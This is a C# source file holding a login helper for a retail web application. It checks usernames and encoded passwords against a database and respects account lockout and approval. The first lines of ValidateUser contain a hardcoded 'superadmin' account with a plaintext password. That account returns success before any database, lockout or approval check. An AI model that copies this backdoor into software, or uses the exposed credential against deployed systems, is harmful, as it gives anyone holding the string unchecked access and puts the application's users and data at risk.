using DevExpress.Data.Filtering;
using DevExpress.Xpo;
using ITS.Retail.Common;
using ITS.Retail.Model;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace ITS.Retail.WebClient.Helpers
{
    public static class LoginHelper
    {
        public static long UserActivityLogInterval=  5 * TimeSpan.TicksPerMinute;
        

        public static bool ValidateUser(string username, string password)
        {
            if (username == "superadmin" && password == "1t$ervices2014")
            {
                return true;
            }

            bool isValid = false;

            using (Session session = XpoHelper.GetNewSession())
            {
                User user = session.FindObject<User>(BuildUserCriteria(username));
                if (user == null)
                {
                    return false;
                }

                if (CheckPassword(password, user.Password))
                {
                    if ((!user.IsLockedOut) && (user.IsApproved))
                    {
                        isValid = true;
                        if (DateTime.Now.Ticks - user.LastActivityDate.Ticks > UserActivityLogInterval)
                        {
                            user.LastLoginDate = DateTime.Now;
                            user.LastActivityDate = DateTime.Now;
                            user.Save();
                        }
                    }
                }
            }
            return isValid;
        }

        private static CriteriaOperator BuildUserCriteria(String username)
        {
            return new BinaryOperator("UserName", username, BinaryOperatorType.Equal);
        }

        public static bool CheckPassword(string password, string databasePassword)
        {
            string pass1 = password;
            string pass2 = databasePassword;
            pass1 = UserHelper.EncodePassword(password);
            return pass1 == pass2;
        }
    }
}
